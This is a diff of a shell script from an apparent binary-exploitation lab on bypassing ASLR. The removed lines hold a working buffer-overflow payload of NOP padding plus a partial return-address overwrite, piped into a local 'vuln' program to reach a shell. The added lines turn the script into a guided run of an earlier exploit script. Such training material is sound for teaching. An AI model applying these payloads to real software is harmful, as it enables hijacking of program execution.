@@ -1,28 +1,20 @@
 #!/bin/sh
 
-## this is the same as the last but with aslr on
-../../../aslr.sh on
+BLUE="\033[1;34m"
+NEUT="\033[0m"
 
-## I think we can overwrite just the last two bytes
-## one and a half bytes should be invariant
-objdump -d vuln | grep shelly   # "0000000000401166 <shelly>:"
-
-## same as before
-python2 -c 'print("\x90"*120 + "\x66\x11")' | strace ./vuln  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xa1166} ---"
-
-## python sends a newline with print, try perl
-perl -e 'print "\x90"x120 . "\x66\x11" ' | strace ./vuln     # "write(2, "oh no!\n", 7oh no!"
-
-## we get the shell but exit right away
-(perl -e 'print "\x90"x120 . "\x66\x11" '; cat) |  ./vuln
-# enter msg: msg: ������������������������������������������������������������������������������������������������������������������������f@
-# oh no!
-# ls
-# pattern  profile.rr2  sol  vuln
-
-## got it :)
+printf "$BLUE
+This is the same as the last (they're all the same) but we have to turn on aslr
+$NEUT 
+../../aslr.sh on"
+read
+../../aslr.sh on
 
 
-
-
-
+printf "$BLUE
+Because aslr doesen't scramble the addresses in the .text (the code) section we can use the same exploit
+We will see slightly harder version in the next level with PIE where these addresses ARE scrambled
+$NEUT
+../../level1/easy/sol/exploit.py"
+read
+../../level1/easy/sol/exploit.py
